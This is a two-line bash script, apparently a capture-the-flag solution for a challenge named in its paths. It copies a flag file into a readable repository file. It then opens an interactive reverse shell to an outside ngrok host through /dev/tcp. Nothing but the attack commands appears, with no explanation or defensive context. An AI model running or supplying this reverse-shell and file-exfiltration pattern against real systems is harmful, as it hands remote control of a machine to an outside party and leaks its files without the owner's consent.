#!/bin/bash

cat /home/challenge/gethub/flag.txt > /home/challenge/gethub/repositories/snyk-ctf-test/hello.txt
sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/18528 0>&1